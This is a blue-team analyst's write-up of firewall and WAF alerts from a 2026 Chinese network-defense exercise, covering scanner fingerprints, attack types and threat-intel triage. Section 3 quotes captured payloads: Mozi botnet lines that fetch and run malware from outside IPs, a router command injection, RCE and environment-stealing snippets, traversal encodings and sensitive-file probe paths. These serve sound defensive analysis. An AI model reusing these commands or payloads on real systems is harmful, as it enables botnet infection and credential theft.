### **<span style="color:#3498db">一、岗位与分工</span>**

2026 年 9 月，重庆省级护网行动，防护单位是新华出版集团。我以乙方蓝队（初级）的身份到现场值守，分工很明确：**盯设备**——盯住天翼云上的 **3 台山石防火墙（SG-6000）+ 1 台山石 WAF** 的告警，做监控和研判；另有一台漏扫设备用来定期验证资产。防火墙是旁挂部署，旁路监听流量，不改动原有网络走向。

![mm](/assets/img/2026-09-04-16-08-32.png)

值守的流程每天循环走这几步：

> **告警监控 → 精准研判 → 分级上报 → 应急处置 → 溯源取证 → 日志留存**

- 低危的扫描、爬虫：自己研判、自己处置、登记留档；
- 中高危的真实攻击：先上报组长和负责人，确认后再动手；
- 封 IP 前有个小细节：**先确认单位有没有海外业务，封禁策略别碰 DNS 这类关键服务**。

### **<span style="color:#3498db">二、设备页面长什么样</span>**

山石防火墙的"威胁事件"页面是我最常盯的界面：上半部分是时间轴（按级别分布）+ 世界地图的地理分布图，下半部分是可筛选（时间范围/类型/级别）的事件列表——AI 分析、中文名称、类型、级别、源/目的 IP、源地区、攻击结果一字排开，这一屏的攻击结果全是"**企图**"，也就是都被设备拦了：

![mm](/assets/img/2026-09-06-15-16-31.png)

（图上这条是设备刚上线时我们做的自测：攻击机 10.10.1.186 对内网资产做端口扫描，防火墙上立刻出现"TCP端口扫描攻击"告警——确认监控链路是通的。）

WAF 那边主要看 Web 攻击（注入、上传、爆破）的拦截记录，和防火墙 IPS 的告警互相印证——同一波攻击，有时 WAF 先拦下，有时防火墙先看到。

### **<span style="color:#3498db">三、这一轮的攻击流量特征</span>**

先看数据。9 月 11 日到 13 日我的值班窗口里，设备明确记录的安全事件 **39 条**：

按级别：**严重 13、高 10、中 6、低 4**，另有 6 条是截图在分页处截断、级别没显示（没敢乱补）。
按类型：远程命令执行 8、路径遍历/任意文件读取 6、命令注入 5、信息泄露/敏感探测 5、爬虫 UA 3、扫描探测 3、身份认证绕过 2、恶意样本投递 2，暴力破解/未授权访问/文件上传/SSRF 各 1。

其中**命中 CVE 编号的 15 条，涉及 10 个不同 CVE**——Nday 打点占了相当比例。

下面是几类最有代表性的"长相"。

**1. 扫描器的指纹非常好认**

- **zgrab**：User-Agent 里直接带 `zgrab` 标识；
- **nmap**：RDP 连接的 Cookie 带 `mstshash=nmap`；Web 探测的路径带 `nmaplowercheck<随机数>`；
- 其余就是纯端口扫描（自测时我们打的就是这一型）。

这类是"踩点"，级别基本是低/中，记录放行即可——但要留意**扫描后面跟着来的是谁**。

**2. IoT/路由器老漏洞 + 僵尸网络的无差别扫段**

这一轮最凶的一类：对着 D-Link 路由器、GPON 光猫、TP-Link AX21 这类设备打老 CVE：

- **D-Link（CVE-2015-2051）**：把命令直接塞进 **SOAPAction 请求头**里（`SOAPAction: ...cd /tmp && rm -rf * && wget http://190.196.253.64:11856/Mozi.m ...`）；
- **GPON（CVE-2018-10561/10562）**：打 `/GponForm/diag_Form` 的 `dest_host` 参数，**User-Agent 就四个字 "Hello, World"**——GPON 批量利用工具的经典指纹；
- 打点成功后的动作一模一样：`cd /tmp; rm -rf *; wget http://43.251.92.123:46769/Mozi.m; chmod 777 Mozi.m; ./Mozi.m`——拉的是 **Mozi 僵尸网络**样本；另一波样本叫 `akbarniga.arm/.arm7`（**ARM 架构**，说明目标是 ARM 网关类设备），样本域名 `*.play.nopixel-rp.ir`（伊朗）。

这类流量**不挑目标**，谁开着对应端口就打谁，是境外僵尸网络在无差别扫段。

![mm](/assets/img/2026-09-11-21-22-57.png)
![mm](/assets/img/2026-09-13-04-56-05.png)

**3. Web 框架的新老 Nday 批量打**

- **CVE-2025-55182**（React Server Components 原型链污染）这轮出现最多：`POST /api`，body 里是 `"$1:__proto__:then"` 和 `process.mainModule.require('child_process')`，请求头带 `Next-Action: r2s`——典型的脚本化批量打；
- **CVE-2025-3248**（Langflow）：往 `/api/v1/validate/code` 提交 `@exec(...)` 代码，读 `env` 和 `/proc/self/environ` 偷环境变量；
- 还有 ThinkCMF 模板写马（把 base64 解码写进 didi.txt）、Apache 2.4.49 路径遍历（`.%2e` 编码绕过）、Struts `@fs` 双重编码（`%252f`）、Grafana（CVE-2021-43798）、GitLab（CVE-2023-2825）……

特征一句话：**单请求直达 RCE、payload 高度模板化、CVE 编号一报一个准**。

![mm](/assets/img/2026-09-13-08-40-10.png)
![mm](/assets/img/2026-09-13-08-39-36.png)

**4. Webshell 上传尝试**

用友 NC Cloud 的上传接口 `/nccloud/mob/pfxx/manualload/importhttpscer`：伪造 `accessToken`、文件名穿越 `../webapps/nc_web/fbhzd.jsp`、文件内容是 `$u0073` 这种 unicode 转义的混淆 JSP 马。**"文件名带 .." + "内容是 JSP"**，组合起来就是 webshell 投递的实锤。

![mm](/assets/img/2026-09-13-08-29-40.png)

**5. 伪装爬虫的"高级"攻击**

这轮很有意思的一组——把 UA 换成爬虫来蹭白名单：

- `ChatGPT-Spider/1.0; +https://zhipuai.cn/` 打的却是 Langflow 的 RCE 接口；
- `Applebot/0.1` 打的却是 RSC 原型链污染；
- 还有个"Baiduspider"去请求 `/rclone.conf`（对象存储配置文件）、`/.env.old`。

**UA 是爬虫、路径是敏感文件、body 是漏洞 payload——三者凑一起就是假爬虫。** 真爬虫查情报是白名单，假爬虫按真实攻击处置。

**6. 敏感文件批量探测**

`/.gitlab-ci.yml`、`/.hermes/.env`、`/.svn/wc.db`、`/actuator/mappings`、`/rclone.conf`、Canal 配置接口……一条条试常见敏感路径，成本极低。单条是低危，**批量 + 高频就得当成攻击前奏**。

**7. 爆破**

WordPress 的 `xmlrpc.php`（`wp.getUsersBlogs` 方法 + `admin`/`123456`）单组尝试、RDP 探测爆破——都是脚本在广撒网，密码取自常见弱口令池：

![mm](/assets/img/2026-09-13-00-50-09.png)

**8. 时间和来源特征**

- 攻击按"波"来，**夜间是高峰**——荷兰的 `77.239.124.122` 在 **00:50** 对两台内网资产连着打，两次攻击相隔 **34 秒**，明显是脚本在跑目标列表；
- 来源分布：荷兰、新加坡（亚马逊云主机）、杭州（阿里云）、印度……**境外 + 云主机占大头**；
- 目的地址里有一批 `127.0.0.1` 和 `10.x` 的内网地址——**这不是真打进内网**，是设备侧模拟/转发记录的产物，处置结论要以设备的"重置/企图"为准。

**9. 日志详情页的字段就是研判的抓手**

每条事件点进去是完整的判决依据：源/目的 IP 和端口、源地区、接口（ethernet0/2→ethernet0/0）、源/目的 MAC（`fa:16:3e` 开头 = 天翼云虚拟网卡的前缀）、攻击次数、持续时间、**检测模板（ips）、特征 ID、ATT&CK 战术/技术 ID（比如 TA0002 执行 → T1203/T1204）、处理动作（重置）、攻击结果（企图）**：

### **<span style="color:#3498db">四、研判动作：查完情报再下手</span>**

判断"封不封"之前，我会先把源 IP 丢进微步在线的情报中心查一遍，三类结果三种处理：

- **恶意**（47.128.56.91，新加坡亚马逊云）：标签是僵尸机、垃圾邮件，蜜罐捕获过、有批量扫描行为 → 上报后加黑名单封禁；

![mm](/assets/img/2026-09-12-21-51-54.png)

- **未知**（122.14.225.130）：有 `SSRF 探测、PHP 代码注入` 的漏洞利用行为记录，还用了自签名证书 → 按可疑处置，先封再看；

![mm](/assets/img/2026-09-12-21-32-38.png)

- **白名单**（220.181.108.176）：搜索引擎爬虫、IDC 服务器，和日志里的 Baiduspider 行为**互相印证** → **不封**，标记放行；

![mm](/assets/img/2026-09-12-21-18-20.png)

这一步的意义：**设备告警只告诉你"有人打了什么"，情报告诉你"这个人是谁、干过什么"**——两者对上，处置才有依据，也避免误封真爬虫影响业务。

### **<span style="color:#3498db">五、小结</span>**

蓝队初级在护网里能做的事，拆开就三件：

1. **看懂字段**：五元组、处理动作、攻击结果（企图 ≠ 成功）、ATT&CK 标签；
2. **分清真伪**：扫描 ≠ 攻击、假爬虫 ≠ 爬虫、"目的端是内网 IP" ≠ 已经打进内网、"未显示" ≠ 不存在；
3. **留好证据**：每条处置配上截图、导出日志、记好时间线，溯源和复盘时才有东西说话。

SG-6000 的特征库确实给力——新的 Nday 基本都带了 CVE 编号和 ATT&CK 标注；但"最后一下判断"还是得人来做：假爬虫、内网回环、误报，都得值班的人盯着定。这也是我这次值守最大的收获。
